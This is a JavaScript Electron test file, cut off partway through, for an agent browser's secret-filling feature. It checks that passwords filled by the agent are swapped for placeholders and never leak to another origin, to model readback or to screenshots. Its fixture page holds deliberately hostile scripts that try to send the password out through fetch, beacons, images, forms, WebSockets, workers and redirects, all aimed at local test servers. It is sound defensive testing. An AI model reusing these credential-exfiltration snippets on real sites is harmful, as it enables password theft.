// Hidden native windows, two loopback sites, and the real task host and interception.
// Assertions and reports use fixed sentences: request bodies never enter diagnostics.
import { createHash } from "node:crypto";
import { createServer } from "node:http";
import { once } from "node:events";
import { fileURLToPath } from "node:url";
import { app, BrowserWindow, ipcMain, webContents } from "electron";
import { createBrowserSecrets } from "@openwork/computer-use/browser-secrets";
import { createBrowserTaskHost } from "@openwork/computer-use/browser-task";
import { createSecretInterception } from "../../electron/browser-secret-interception.mjs";
import { createWebMcpBroker } from "../../electron/webmcp-host.mjs";

const VALUE = 'fake test pass "quoted" \\ üñï ✓ &+<tag>';
const SESSION = "test-conversation";
class CheckFailed extends Error {}
function expect(condition, message) { if (!condition) throw new CheckFailed(message); }
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
async function until(probe, ms = 3000) {
  for (const deadline = Date.now() + ms; Date.now() < deadline;) { if (await probe()) return true; await sleep(20); }
  return false;
}
const htmlEscape = (text) => text.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll('"', "&quot;").replaceAll("'", "&#39;");
const spellings = (value) => [...new Set([value, encodeURIComponent(value), new URLSearchParams({ p: value }).toString().slice(2), JSON.stringify(value).slice(1, -1), Buffer.from(value).toString("base64"), Buffer.from(value).toString("hex"), htmlEscape(value)])];
// Inspect individual strings as well as serialized JSON, which adds its own escaping.
function strings(value) {
  if (typeof value === "string") return [value];
  if (!value || typeof value !== "object") return [];
  return Object.entries(value).flatMap(([key, item]) => [key, ...strings(item)]);
}
function clean(value, forbidden, message) {
  expect([...strings(value), JSON.stringify(value)].every((text) => forbidden.every((part) => !text.includes(part))), message);
}

const PAGE = `<!doctype html><meta charset="utf-8"><title>Test login</title>
<form id="login" method="post" action="/collect/native"><label>Password <input id="password" name="password" type="password"></label><input id="other" name="other" aria-label="Other"><button id="submit">Submit</button></form>
<form id="alternate" method="post"><button type="button" id="noop">No operation</button></form><output id="output"></output>
<script>
window.seen = []; window.variables = {}; window.done = false;
window.readPage = () => ({ seen, variables, fields: [...document.querySelectorAll('input')].map(e => e.value), storage: {...localStorage}, title: document.title, text: document.body.innerText });
window.remember = () => { const value = document.getElementById('password')?.value || ''; seen.push(value); variables.last = value; return value; };
addEventListener('input', remember, true);
addEventListener('beforeunload', () => navigator.sendBeacon(window.reportTo || '/seen', JSON.stringify(readPage())));
window.send = async (url, body, extra = {}) => { try { const response = await fetch(url, {method:'POST', headers:{'Content-Type':'text/plain'}, body, ...extra}); return await response.text(); } catch { return 'unreadable'; } };
window.run = async () => { await send('/collect/json', JSON.stringify({password:remember()}), {headers:{'Content-Type':'application/json'}}); };
document.getElementById('login').addEventListener('submit', e => { remember(); if (window.native) return; e.preventDefault(); Promise.resolve(run()).then(() => done = true, () => done = true); });
</script>`;
const WORKER = `onmessage = async e => { const results = []; for (const url of e.data.urls) { try { results.push(await (await fetch(url,{method:'POST',headers:{'Content-Type':'text/plain'},body:e.data.body})).text()); } catch { results.push('unreadable'); } } postMessage(results); };`;
const SHARED = `onconnect = e => { const port=e.ports[0]; port.onmessage=async e => { const results=[]; for(const url of e.data.urls) { try { results.push(await (await fetch(url,{method:'POST',headers:{'Content-Type':'text/plain'},body:e.data.body})).text()); } catch { results.push('unreadable'); } } port.postMessage(results); }; port.start(); };`;
const SW = `self.addEventListener('install',()=>self.skipWaiting()); self.addEventListener('activate',e=>e.waitUntil(clients.claim())); self.addEventListener('fetch',e=>{ if(new URL(e.request.url).pathname.startsWith('/collect/')) e.respondWith(fetch(e.request)); });`;
const FRAME = `<!doctype html><script>window.seen=[]; onmessage=async e=>{seen.push(e.data.body); const results=[]; for(const url of e.data.urls) {try {results.push(await (await fetch(url,{method:'POST',headers:{'Content-Type':'text/plain'},body:e.data.body})).text());}catch{results.push('unreadable');}} parent.postMessage({seen,results},'*');};</script>`;

async function site() {
  const requests = [], reports = [], messages = [], sockets = new Set();
  const server = createServer(async (request, response) => {
    const chunks = []; for await (const chunk of request) chunks.push(chunk);
    const body = Buffer.concat(chunks), url = new URL(request.url || "/", "http://127.0.0.1");
    const headers = { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store", "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*" };
    if (request.method === "OPTIONS") { response.writeHead(204, headers); response.end(); return; }
    if (url.pathname === "/seen") reports.push(body.toString());
    if (/^\/(collect|redirect)/.test(url.pathname)) requests.push({ path: url.pathname, query: url.search, method: request.method, body: body.toString(), headers: request.headers });
    if (url.pathname === "/redirect") {
      response.writeHead(Number(url.searchParams.get("code")), { ...headers, Location: url.searchParams.get("to") }); response.end(); return;
    }
    if (url.pathname === "/collect/echo" || url.pathname === "/collect/no-cors") {
      if (url.pathname.endsWith("no-cors")) delete headers["Access-Control-Allow-Origin"];
      response.writeHead(200, headers); response.end(body); return;
    }
    if (url.pathname === "/collect/echo-document") {
      const received = new URLSearchParams(body.toString()).get("password") || "";
      response.writeHead(200, headers);
      response.end(`<!doctype html><title>Echo response</title><p>${htmlEscape(received)}</p>`); return;
    }
    if (url.pathname === "/collect/latin") {
      response.writeHead(200, { "Content-Type": "text/html" });
      response.end(`<!doctype html><title>${htmlEscape(VALUE)}</title><p>Echo ${htmlEscape(VALUE)}</p><button>Continue</button>`); return;
    }
    const source = url.pathname === "/worker.js" ? WORKER : url.pathname === "/shared.js" ? SHARED : url.pathname === "/sw.js" ? SW : null;
    if (source) headers["Content-Type"] = "text/javascript";
    response.writeHead(200, headers);
    response.end(source || (url.pathname === "/frame" ? FRAME : url.pathname.startsWith("/collect/") ? "<!doctype html><title>Received</title><p>Received</p><button>Continue</button>" : PAGE));
  });
  server.on("connection", socket => { sockets.add(socket); socket.on("close", () => sockets.delete(socket)); });
  server.on("upgrade", (request, socket) => {
    const accept = createHash("sha1").update(`${request.headers["sec-websocket-key"]}258EAFA5-E914-47DA-95CA-C5AB0DC85B11`).digest("base64");
    socket.write(`HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: ${accept}\r\n\r\n`);
    socket.once("data", frame => {
      const length = frame[1] & 127, offset = length === 126 ? 4 : 2, size = length === 126 ? frame.readUInt16BE(2) : length;
      const mask = frame.subarray(offset, offset + 4);
      messages.push(Buffer.from(frame.subarray(offset + 4, offset + 4 + size).map((byte, index) => byte ^ mask[index % 4])).toString());
      socket.end();
    });
  });
  server.listen(0, "127.0.0.1"); await once(server, "listening");
  const address = server.address();
  return { server, requests, reports, messages, sockets, origin: `http://127.0.0.1:${typeof address === "object" && address ? address.port : 0}` };
}

async function run() {
  app.commandLine.appendSwitch("disable-gpu");
  app.setPath("userData", process.env.OPENWORK_SECRET_PAGES_PROFILE);
  const timeout = setTimeout(() => { console.error("Secret pages fixture timed out"); app.exit(1); }, 115_000);
  app.on("window-all-closed", () => {});
  await app.whenReady(); if (process.platform === "darwin") app.dock?.hide();
  ipcMain.handle("openwork:webmcp:frame-policy", () => ({ allowed: true, originKeyed: true }));
  const allowed = await site(), other = await site();
  // Different site as well as different port exercises out-of-process frames.
  other.origin = other.origin.replace("127.0.0.1", "localhost");
  let serial = 0;
  const results = [];
  const cases = [];
  const add = (name, execute) => cases.push({ name, execute });

  async function context({ enabled = true, approve = async () => true } = {}) {
    const store = createBrowserSecrets({ allowLoopbackHttp: true });
    const secret = store.add({ sessionId: SESSION, label: "Test password", kind: "password", origins: [allowed.origin], value: VALUE });
    const hooks = createSecretInterception({ secrets: store, armGraceMs: 100 });
    const tabs = [], returned = [], placeholders = [], checks = [], facts = {}, knownRefs = new Map();
    let approvals = 0, credentialApprovals = 0;
    const broker = createWebMcpBroker({ getTab: id => tabs.find(tab => tab.tabId === id), getActiveTabId: () => tabs[0]?.tabId, redact: value => store.redact(value) });
    const host = createBrowserTaskHost({ getTab: id => tabs.find(tab => tab.tabId === id), tabsFor: sessionId => tabs.filter(tab => tab.owner === sessionId), ownerOf: id => tabs.find(tab => tab.tabId === id)?.owner,
      activeFor: sessionId => tabs.find(tab => tab.owner === sessionId)?.tabId, enabled: () => true, allowed: async () => true, changed() {}, isVisible: () => true,
      secrets: store, secretsEnabled: () => enabled, armSecretSwap: tab => hooks.arm(tab),
      approveSecret: async (...args) => { approvals++; return approve(...args); }, approveCredential: async () => { credentialApprovals++; return true; },
      siteTools: args => broker.listTools(args), runSiteTool: (args, options) => broker.executeTool(args, options), navigate: (tab, url) => tab.view.webContents.loadURL(url) });
    async function open(url = allowed.origin, owner = SESSION) {
      const window = new BrowserWindow({ show: false, width: 900, height: 650, webPreferences: { sandbox: true, contextIsolation: true, backgroundThrottling: false,
        preload: fileURLToPath(new URL("../../electron/browser-content-preload.cjs", import.meta.url)), partition: `secret-pages-${++serial}` } });
      const tab = { tabId: `tab-${serial}`, owner, webMcpRevision: 0, window, view: { webContents: window.webContents } };
      tabs.push(tab);
      window.webContents.on("did-navigate", () => { tab.webMcpRevision++; store.documentChanged(tab.tabId); host.invalidate(tab.tabId); });
      await window.webContents.loadURL(url);
      // Observe JavaScript's own report at a disallowed destination. A same-origin report
      // containing a placeholder can legitimately be rewritten on the network and would
      // falsely claim that page JavaScript had read the value.
      await window.webContents.executeJavaScript(`window.reportTo=${JSON.stringify(other.origin + '/seen')}; true`);
      return tab;
    }
    const page = (tab, code) => tab.view.webContents.executeJavaScript(code, true);
    async function request(tab, operation, args = {}, sessionId = tab.owner) {
      const result = await host.request({ sessionId, operation, args: { tabId: tab.tabId, ...args } }); returned.push(result);
      for (const element of result.elements || result.observation?.elements || []) knownRefs.set(`${tab.tabId}:${element.name}`, element.ref);
      return result;
    }
    const observe = (tab, args = {}) => request(tab, "observe", { mode: "interactive", query: { exact: false, name: "" }, ...args });
    const ref = (observation, name) => { const found = observation.elements?.find(element => element.name === name); expect(found, "the requested control was observed"); return found.ref; };
    async function fill(tab, observation = null, secretRef = secret.secretRef) {
      const observed = observation || await observe(tab);
      const result = await request(tab, "act", { observationId: observed.observationId, actions: [{ type: "fill_secret", ref: ref(observed, "Password"), secretRef }] });
      const placeholder = await page(tab, "document.getElementById('password')?.value || ''");
      if (/^[A-Za-z0-9]{32}$/.test(placeholder)) placeholders.push(placeholder);
      return result;
    }
    async function click(tab, name = "Submit") {
      const observed = await observe(tab);
      return request(tab, "act", { observationId: observed.observationId, actions: [{ type: "click", ref: ref(observed, name) }] });
    }
    const check = (condition, message) => { if (!condition) checks.push(message); };
    const state = tab => store.status(SESSION, tab.tabId).at(-1)?.state;
    const sent = (site, path) => site.requests.filter(request => request.path === path);
    const startAllowed = allowed.requests.length, startOther = other.requests.length, startReports = [allowed.reports.length, other.reports.length], startMessages = other.messages.length;
    async function verify({ echo = false } = {}) {
      clean(other.requests.slice(startOther), spellings(VALUE), "the second server received an encoding of the value");
      clean(other.messages.slice(startMessages), spellings(VALUE), "a WebSocket frame leaked the value");
      clean(returned, [...spellings(VALUE), ...placeholders], "a model result contains a value or placeholder");
      if (!echo) {
        clean([...allowed.reports.slice(startReports[0]), ...other.reports.slice(startReports[1])], spellings(VALUE), "a departing page read the value");
        for (const tab of tabs) {
          const snapshot = await page(tab, "typeof readPage === 'function' ? readPage() : ({ title:document.title, text:document.body.innerText })").catch(() => ({}));
          clean(snapshot, spellings(VALUE), "page script read an encoding of the value");
        }
      }
      facts.allowedRequests = allowed.requests.length - startAllowed;
      facts.otherRequests = other.requests.length - startOther;
      expect(checks.length === 0, checks.join("; "));
    }
    async function close() { await hooks.dispose(); for (const tab of tabs) { store.tabClosed(tab.tabId); tab.window.destroy(); } store.clear(); await sleep(40); }
    return { store, secret, hooks, host, tabs, returned, placeholders, facts, open, page, request, observe, ref, fill, click, check, state, sent, verify, close,
      approvals: () => approvals, credentialApprovals: () => credentialApprovals };
  }
  async function using(options, execute) {
    const c = await context(options);
    try { await execute(c); await c.verify({ echo: c.facts.responseEcho === true }); return c.facts; }
    catch (error) { if (error instanceof CheckFailed) error.facts = c.facts; throw error; }
    finally { await c.close(); }
  }
  const verified = (c, receipt) => c.check(receipt.steps?.[0]?.outcome === "verified", "fill_secret did not report verified");
  const notSent = (c, tab, receipt) => { c.check(c.state(tab) === "not_sent", "an unsent secret was not reported not_sent"); c.check(JSON.stringify(receipt).includes("browser_handoff"), "the receipt did not direct a handoff"); };
  const install = (c, tab, code) => c.page(tab, `window.run = async () => { ${code} }; true`);
  const pathFor = () => `/collect/case-${++serial}`;

  add("screenshots stay blocked after a native response echoes the secret into a new document", () => using({}, async c => {
    c.facts.responseEcho = true;
    const tab = await c.open();
    await c.page(tab, "window.native=true; document.getElementById('login').action='/collect/echo-document'; true");
    verified(c, await c.fill(tab));
    await c.click(tab);
    expect(await until(async () => await c.page(tab, "document.title") === "Echo response"), "the native form committed its echo response");
    expect(await c.page(tab, "document.body.innerText") === VALUE, "the new document actually holds the echoed value");
    const image = await c.observe(tab, { includeImage: true });
    c.check(image.ok === false && image.code === "credential_on_screen", "a response document exposed its echoed value through an image");
    c.store.remove(SESSION, c.secret.secretRef);
    const afterRemoval = await c.observe(tab, { includeImage: true });
    c.check(afterRemoval.ok === false && afterRemoval.code === "credential_on_screen", "removing the secret cleared screenshot protection while an echo remained");
    // The echo is still on the page: text read by operations that begin after the removal holds none of it.
    const text = await c.observe(tab, { mode: "full", includeText: true });
    const extracted = await c.request(tab, "extract", { question: "Echo", maxChars: 8000 });
    c.check(text.ok === true && text.text === "[secret]", "removing the secret let a later observation read the echoed value");
    clean([text, extracted, await c.request(tab, "tabs")], spellings(VALUE), "removing the secret let a later readback hold the echoed value");
  }));

  for (const native of [true, false]) add(`1 baseline ${native ? "native POST" : "fetch JSON"}`, () => using({}, async c => {
    const tab = await c.open(), path = pathFor();
    await c.page(tab, `window.native=${native}; document.getElementById('login').action=${JSON.stringify(path)}; true`);
    if (!native) await install(c, tab, `await send(${JSON.stringify(path)}, JSON.stringify({password:remember()}), {headers:{'Content-Type':'application/json'}});`);
    const observation = await c.observe(tab);
    c.check(observation.availableSecrets?.[0]?.secretRef === c.secret.secretRef, "allowed page did not offer its secret");
    verified(c, await c.fill(tab, observation)); await c.click(tab);
    const received = c.sent(allowed, path).at(-1);
    c.check(!!received && (native ? new URLSearchParams(received.body).get("password") : JSON.parse(received.body).password) === VALUE, "allowed server did not receive the value");
    c.check(c.state(tab) === "sent", "status did not become sent");
    await tab.view.webContents.loadURL(other.origin);
    c.check(!(await c.observe(tab)).availableSecrets, "second page offered an unavailable secret");
  }));

  add("2 declined secret approval ignores typed-password standing approval", () => using({ approve: async () => false }, async c => {
    const tab = await c.open(); const receipt = await c.fill(tab);
    c.check(receipt.code === "credential_declined", "secret approval was not declined");
    c.check(c.approvals() === 1 && c.credentialApprovals() === 0, "secret did not have its own approval");
    c.check(await c.page(tab, "document.getElementById('password').value") === "", "a declined field was not empty");
    c.check(!c.hooks.holds(tab) && !tab.view.webContents.debugger.isAttached(), "decline left interception on");
  }));

  const mutations = [
    ["replaced input", "document.getElementById('password').outerHTML='<input id=\"password\" name=\"password\" type=\"password\">'", true],
    ["changed type", "document.getElementById('password').type='text'", true],
    ["retyped input", "document.getElementById('password').value='person-edited-during-approval'", true],
    ["navigated second site", null, true],
    ["changed form action", `document.getElementById('login').action=${JSON.stringify(`${other.origin}/collect/action-change`)}`, false],
    ["moved same element to another form", `document.getElementById('alternate').action=${JSON.stringify(`${other.origin}/collect/moved`)}; document.getElementById('alternate').append(document.getElementById('password')); document.getElementById('submit').setAttribute('form','alternate'); window.native=true`, true],
  ];
  for (const [name, mutation, refuse] of mutations) add(`3 approval race: ${name}`, async () => {
    let answer, asked;
    const arrived = new Promise(resolve => { asked = resolve; });
    const decision = new Promise(resolve => { answer = resolve; });
    return using({ approve: async () => { asked(); return decision; } }, async c => {
      const tab = await c.open(), observed = await c.observe(tab), filling = c.fill(tab, observed);
      await arrived;
      if (mutation) await c.page(tab, `${mutation}; true`); else await tab.view.webContents.loadURL(other.origin);
      answer(true); const receipt = await filling;
      if (refuse) {
        const code = receipt.code || receipt.failure?.code;
        c.check(!receipt.ok && ["stale_element", "stale_observation", "page_changed"].includes(code), "changed target was not refused as stale");
        const expected = name === "retyped input" ? "person-edited-during-approval" : "";
        c.check(await c.page(tab, "document.getElementById('password')?.value || ''") === expected, "a changed target received text or lost the person's edit");
      } else {
        verified(c, receipt); await c.page(tab, "window.native=true; true"); await c.click(tab);
        c.check(c.state(tab) === "not_sent", "second-origin form was marked sent");
        const received = other.requests.at(-1);
        c.check(!!received && c.placeholders.some(placeholder => received.body.includes(placeholder)), "second-origin form did not carry only its placeholder");
      }
    });
  });

  for (const swap of [false, true]) add(`4 focus handler ${swap ? "swaps field" : "navigates"}`, () => using({}, async c => {
    const tab = await c.open();
    // The shipping panel enables focus emulation for its background agent viewport.
    // Without it an invisible native window suppresses DOM focus events entirely.
    tab.view.webContents.debugger.attach('1.3');
    await tab.view.webContents.debugger.sendCommand('Emulation.setFocusEmulationEnabled', { enabled: true });
    await c.page(tab, `window.focusHandlerRan=false; document.getElementById('password').addEventListener('focus', () => { window.focusHandlerRan=true; ${swap ? "const old=document.getElementById('password'); const copy=old.cloneNode(); old.replaceWith(copy); copy.focus();" : `location.assign(${JSON.stringify(other.origin)})`} }, {once:true}); true`);
    const receipt = await c.fill(tab); await sleep(100);
    c.facts.focusHandlerRan = swap ? await c.page(tab, 'window.focusHandlerRan === true') : new URL(tab.view.webContents.getURL()).origin === other.origin;
    c.check(c.facts.focusHandlerRan, "the native fixture did not exercise the focus mutation");
    c.check(!receipt.ok, "focus mutation was not refused");
    c.check(await c.page(tab, "document.getElementById('password')?.value || ''") === "", "focus mutation received text");
  }));

  for (const remove of [false, true]) add(`5 after fill: ${remove ? "removed" : "cleared"} input`, () => using({}, async c => {
    const tab = await c.open(), path = pathFor(); verified(c, await c.fill(tab));
    await c.page(tab, remove ? "document.getElementById('password').remove(); true" : "document.getElementById('password').value=''; true");
    await install(c, tab, `await send(${JSON.stringify(path)}, JSON.stringify({password:document.getElementById('password')?.value || ''}), {headers:{'Content-Type':'application/json'}});`);
    const receipt = await c.click(tab); notSent(c, tab, receipt);
    clean(c.sent(allowed, path), spellings(VALUE), "allowed server got a removed value");
  }));

  for (const transport of ["fetch", "beacon", "image", "GET form", "WebSocket"]) add(`5 copied placeholder exfiltration: ${transport}`, () => using({}, async c => {
    const tab = await c.open(), path = pathFor(), target = other.origin + path;
    verified(c, await c.fill(tab));
    const sending = transport === "fetch" ? `await send(${JSON.stringify(target)}, saved)`
      : transport === "beacon" ? `navigator.sendBeacon(${JSON.stringify(target)}, saved)`
      : transport === "image" ? `await new Promise(resolve=>{const image=new Image(); image.onload=image.onerror=resolve; image.src=${JSON.stringify(target)}+'?p='+saved;})`
      : transport === "GET form" ? `const frame=document.createElement('iframe'); frame.name='sink'; document.body.append(frame); const form=document.createElement('form'); form.target='sink'; form.method='GET'; form.action=${JSON.stringify(target)}; const hidden=document.createElement('input'); hidden.name='p'; hidden.value=saved; form.append(hidden); document.body.append(form); form.submit()`
      : `await new Promise(resolve=>{const socket=new WebSocket(${JSON.stringify(target.replace("http:", "ws:"))}); socket.onopen=()=>socket.send(saved); socket.onclose=socket.onerror=resolve;})`;
    await c.page(tab, "window.saved=remember(); variables.saved=saved; localStorage.setItem('copied',saved); const hidden=document.createElement('input'); hidden.type='hidden'; hidden.value=saved; document.body.append(hidden); document.getElementById('password').value=''; true");
    await install(c, tab, `${sending}; await send('/collect/empty', JSON.stringify({password:''}), {headers:{'Content-Type':'application/json'}});`);
    const receipt = await c.click(tab); await sleep(80); notSent(c, tab, receipt);
    if (transport === "WebSocket") c.check(other.messages.at(-1) === c.placeholders[0], "WebSocket did not deliver the unchanged placeholder");
    else c.check(c.sent(other, path).some(request => (request.body + request.query).includes(c.placeholders[0])), "exfiltration did not deliver the unchanged placeholder");
  }));

  for (const transform of ["base64", "reversed", "SHA-256"]) add(`6 transformed placeholder: ${transform}`, () => using({}, async c => {
    const tab = await c.open(), path = pathFor(); verified(c, await c.fill(tab));
    const expression = transform === "base64" ? "btoa(value)" : transform === "reversed" ? "[...value].reverse().join('')" : "Array.from(new Uint8Array(await crypto.subtle.digest('SHA-256',new TextEncoder().encode(value))),b=>b.toString(16).padStart(2,'0')).join('')";
    await install(c, tab, `const value=remember(); const transformed=${expression}; variables.transformed=transformed; await send(${JSON.stringify(path)},JSON.stringify({password:transformed}),{headers:{'Content-Type':'application/json'}});`);
    notSent(c, tab, await c.click(tab)); clean(c.sent(allowed, path), spellings(VALUE), "transformed submission sent the value");
  }));

  add("7 response echo encodings redacted in every model readback", () => using({}, async c => {
    const tab = await c.open(); verified(c, await c.fill(tab));
    await install(c, tab, `const echoed=await send('/collect/echo',remember()); variables.echoed=echoed;
      const encoded=[echoed,encodeURIComponent(echoed),new URLSearchParams({p:echoed}).toString().slice(2),JSON.stringify(echoed).slice(1,-1),btoa(unescape(encodeURIComponent(echoed))),Array.from(new TextEncoder().encode(echoed),b=>b.toString(16).padStart(2,'0')).join(''),echoed.replaceAll('&','&amp;').replaceAll('<','&lt;').replaceAll('>','&gt;').replaceAll('"','&quot;')];
      for(const text of encoded){const p=document.createElement('p');p.textContent='Echo '+text;document.body.append(p);} document.title=echoed;`);
    const receipt = await c.click(tab);
    c.check(!!receipt.observation, "act receipt did not include its observation");
    c.check(await c.page(tab, "variables.echoed") === VALUE, "echo response did not exercise actual page exposure");
    c.facts.responseEcho = true; c.facts.pageReadValue = true;
    await c.observe(tab, { includeText: true }); await c.observe(tab, { mode: "full", includeText: true });
    await c.request(tab, "extract", { question: "Echo", maxChars: 8000 }); await c.request(tab, "tabs");
  }));

  add("7 non-ASCII echo without charset is redacted", () => using({}, async c => {
    const tab = await c.open(); verified(c, await c.fill(tab));
    await c.page(tab, "window.native=true; document.getElementById('login').action='/collect/latin'; true");
    const receipt = await c.click(tab);
    const mojibake = await c.page(tab, "document.title");
    c.facts.responseEcho = true; c.facts.charset = await c.page(tab, "document.characterSet");
    c.facts.mojibakeRedacted = !strings(receipt).some(text => text.includes(mojibake));
    await c.observe(tab, { mode: "full", includeText: true }); await c.request(tab, "extract", { question: "Echo" }); await c.request(tab, "tabs");
    clean(c.returned, [mojibake], "a Latin-1-decoded echo reached model readback");
  }));

  add("8 real preload and WebMCP broker echo", () => using({}, async c => {
    const tab = await c.open(); verified(c, await c.fill(tab));
    await install(c, tab, `const echoed=await send('/collect/echo',remember()); variables.echoed=echoed; await document.modelContext.registerTool({name:'echo',description:'Echo '+echoed,execute:()=>({echoed,typed:remember()})});`);
    await c.click(tab); c.facts.responseEcho = true; c.facts.realBrokerAndPreload = true;
    const tools = await c.request(tab, "site_tools");
    c.check(tools.ok && tools.tools?.length === 1, "real page tool was not discovered");
    const result = await c.request(tab, "site_tool", { toolId: tools.tools?.[0]?.toolId, input: {} });
    c.check(result.ok && result.result?.echoed === "[secret]", "real page tool result was not executed and redacted");
  }));

  add("9 screenshot refused after secret fill", () => using({}, async c => {
    const tab = await c.open(); verified(c, await c.fill(tab));
    await c.page(tab, "document.getElementById('password').remove(); true");
    const receipt = await c.observe(tab, { includeImage: true });
    c.check(receipt.code === "credential_on_screen" && !receipt.image, "filled document allowed a screenshot");
  }));

  for (const [mode, code] of [["native", 307], ["cors fetch", 307], ["native", 302], ["native", 303]]) add(`10 ${mode} redirect ${code}`, () => using({}, async c => {
    const tab = await c.open(), path = pathFor(); verified(c, await c.fill(tab));
    const target = `/redirect?code=${code}&to=${encodeURIComponent(other.origin + path)}`;
    if (mode === "native") await c.page(tab, `window.native=true; document.getElementById('login').action=${JSON.stringify(target)}; true`);
    else await install(c, tab, `await send(${JSON.stringify(target)},JSON.stringify({password:remember()}),{headers:{'Content-Type':'application/json'},mode:'cors'});`);
    await c.click(tab); await sleep(80);
    c.check(c.sent(allowed, "/redirect").at(-1)?.body.includes(mode === "native" ? new URLSearchParams({ password: VALUE }).toString().slice(9) : JSON.stringify(VALUE).slice(1, -1)), "redirect first hop did not exercise a swapped request");
    c.facts.secondHopRequests = c.sent(other, path).length;
  }));

  for (const agent of ["cross-origin iframe", "service worker", "dedicated worker", "shared worker"]) add(`11 ${agent}`, () => using({}, async c => {
    const tab = await c.open(), path = pathFor(), urls = [allowed.origin + path, other.origin + path];
    if (agent === "cross-origin iframe") await c.page(tab, `new Promise(resolve=>{const f=document.createElement('iframe');f.id='frame';f.src=${JSON.stringify(other.origin + "/frame")};f.onload=()=>resolve(true);document.body.append(f);})`);
    if (agent === "service worker") await c.page(tab, "navigator.serviceWorker.register('/sw.js').then(()=>navigator.serviceWorker.ready).then(()=>navigator.serviceWorker.controller || new Promise(resolve=>navigator.serviceWorker.addEventListener('controllerchange',()=>resolve(true),{once:true}))).then(()=>true)");
    verified(c, await c.fill(tab));
    const code = agent === "cross-origin iframe" ? `variables.worker=await new Promise(resolve=>{addEventListener('message',e=>resolve(e.data),{once:true});document.getElementById('frame').contentWindow.postMessage({urls,body},'*');});`
      : agent === "service worker" ? `variables.worker=[];for(const url of urls)variables.worker.push(await send(url,body));`
      : agent === "dedicated worker" ? `variables.worker=await new Promise(resolve=>{const w=new Worker('/worker.js');w.onmessage=e=>{w.terminate();resolve(e.data);};w.postMessage({urls,body});});`
      : `variables.worker=await new Promise(resolve=>{const w=new SharedWorker('/shared.js');w.port.start();w.port.onmessage=e=>{w.port.close();resolve(e.data);};w.port.postMessage({urls,body});});`;
    await install(c, tab, `const body=remember(),urls=${JSON.stringify(urls)}; ${code}`);
    await c.click(tab);
    c.check(await until(() => c.sent(other, path).length > 0), "worker or frame did not send to the second origin");
    c.facts.allowedReceivedValue = c.sent(allowed, path).some(request => request.body === VALUE);
    c.check(c.sent(other, path).every(request => request.body === c.placeholders[0]), "second origin did not receive the unchanged placeholder");
  }));

  for (const cors of [false, true]) add(`12 same-tab replay with ${cors ? "permissive CORS echo" : "unreadable CORS response"}`, () => using({}, async c => {
    const tab = await c.open(); verified(c, await c.fill(tab)); const placeholder = c.placeholders[0];
    await tab.view.webContents.loadURL(`${other.origin}/#${placeholder}`);
    await install(c, tab, `variables.response=await send(${JSON.stringify(allowed.origin + (cors ? "/collect/echo" : "/collect/no-cors"))},location.hash.slice(1),{mode:'cors'});`);
    await c.click(tab);
    const response = await c.page(tab, "variables.response");
    const path = cors ? "/collect/echo" : "/collect/no-cors";
    c.facts.allowedReceivedValue = c.sent(allowed, path).at(-1)?.body === VALUE;
    c.facts.secondPageReadValue = response === VALUE;
    c.facts.responseEcho = cors;
    c.check(!c.facts.allowedReceivedValue, "a new disallowed document replayed the previous document's placeholder");
    c.check(!c.facts.secondPageReadValue, "a disallowed document read a secret via an allowed-origin echo");
    if (!cors) c.check(response === "unreadable", "a response without CORS was readable");
  }));

  add("13 placeholders are tab-bound and handles conversation-bound", () => using({}, async c => {
    const first = await c.open(); verified(c, await c.fill(first));
    const second = await c.open(), path = pathFor();
    await c.page(second, `document.getElementById('password').value=${JSON.stringify(c.placeholders[0])}; true`);
    await install(c, second, `await send(${JSON.stringify(path)},remember());`); await c.click(second);
    c.check(c.sent(allowed, path).at(-1)?.body === c.placeholders[0], "another tab swapped the first tab's placeholder");
    const third = await c.open(allowed.origin, "another-conversation"), before = c.approvals();
    const receipt = await c.fill(third);
    c.check(receipt.code === "unknown_secret" && c.approvals() === before, "another conversation's handle was accepted or approved");
  }));

  add("14 feature off refuses and lists no secrets", () => using({ enabled: false }, async c => {
    const tab = await c.open(), observed = await c.observe(tab);
    c.check(!observed.availableSecrets, "disabled feature listed secrets");
    const receipt = await c.fill(tab, observed);
    c.check(receipt.code === "secrets_unavailable" && c.approvals() === 0, "disabled feature did not refuse before approval");
    c.check(await c.page(tab, "document.getElementById('password').value") === "" && !c.hooks.holds(tab), "disabled feature typed or armed interception");
  }));

  for (const live of [false, true]) add(`15 plain fill containing ${live ? "live placeholder in another field" : "handle"}`, () => using({}, async c => {
    const tab = await c.open(), path = pathFor();
    if (live) verified(c, await c.fill(tab));
    const text = live ? c.placeholders[0] : `literal ${c.secret.secretRef}`;
    const observed = await c.observe(tab);
    const receipt = await c.request(tab, "act", { observationId: observed.observationId, actions: [{ type: "fill", ref: c.ref(observed, "Other"), text }] });
    c.check(receipt.steps?.[0]?.outcome === "verified" && await c.page(tab, "document.getElementById('other').value") === text, "ordinary fill did not type its text literally");
    await install(c, tab, `await send(${JSON.stringify(path)},document.getElementById('other').value);`); await c.click(tab);
    const received = c.sent(allowed, path).at(-1)?.body;
    if (live) { c.facts.otherFieldSwapped = received === VALUE; c.facts.responseEcho = false; }
    else c.check(received === text, "ordinary handle text was interpolated");
  }));

  add("16 real createBrowserPanel product path", async () => {
    const { createBrowserPanel } = await import('../../electron/browser-panel.mjs');
    const store = createBrowserSecrets({ allowLoopbackHttp: true });
    const secret = store.add({ sessionId: SESSION, label: 'Panel test password', kind: 'password', origins: [allowed.origin], value: VALUE });
    const parent = new BrowserWindow({ show: false, webPreferences: { sandbox: true, contextIsolation: true } });
    const panel = createBrowserPanel({ getWindow: () => parent, checkPolicy: async () => {}, secrets: store, secretsEnabled: () => true, approveSecret: async () => true });
    const returned = [], placeholders = [];
    const request = async (operation, args) => {
      const result = await panel.browserTask({ sessionId: SESSION, operation, args });
      returned.push(result); return result;
    };
    const control = (observation, name) => {
      const found = observation.elements?.find(element => element.name === name);
      expect(found, 'the product panel did not observe its requested control'); return found.ref;
    };
    const start = allowed.requests.length, startOther = other.requests.length;
    try {
      const opened = await request('open', { url: allowed.origin + '/panel-product-proof', provider: 'builtin' });
      expect(opened.ok, 'the product panel did not open its real native tab');
      const tabId = opened.tabId;
      const contents = webContents.getAllWebContents().find(contents => contents.getURL() === allowed.origin + '/panel-product-proof');
